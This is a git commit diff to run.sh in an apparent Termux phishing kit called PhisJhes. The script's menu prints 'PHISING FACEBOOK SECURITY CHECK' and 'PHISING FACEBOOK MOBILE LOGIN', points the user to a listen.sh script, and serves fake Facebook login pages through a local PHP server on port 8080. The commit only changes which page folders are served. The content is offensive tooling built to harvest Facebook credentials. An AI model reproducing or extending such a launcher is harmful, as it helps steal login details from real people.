1198acd9dc8f7964047a9e7079079423ae1820d9
bojes90 <50340804+bojes90@users.noreply.github.com>
2019-05-07 11:02:51 +0700

    Update run.sh

--- run.sh
+++ run.sh
@@ -65,7 +65,7 @@ echo $pur"now open new session and run listen.sh"
 echo $ku"__________________________________"
 sleep 1
 echo $pur"  PHISING FACEBOOK SECURITY CHECK  "
-php -S localhost:8080 -t /data/data/com.termux/files/home/PhisJhes/jhes1
+php -S localhost:8080 -t /data/data/com.termux/files/home/PhisJhes/V1
 fi
 
 if [ $pil = 3 ]
@@ -75,7 +75,7 @@ sleep 1
 echo $pur"now open new session and run listen.sh"
 echo $ku"_________________________________"
 echo $pur"  PHISING FACEBOOK MOBILE LOGIN"
-php -S localhost:8080 -t /data/data/com.termux/files/home/PhisJhes/jhes2
+php -S localhost:8080 -t /data/data/com.termux/files/home/PhisJhes/V2
 fi
 
 if [ $pil = 4 ]
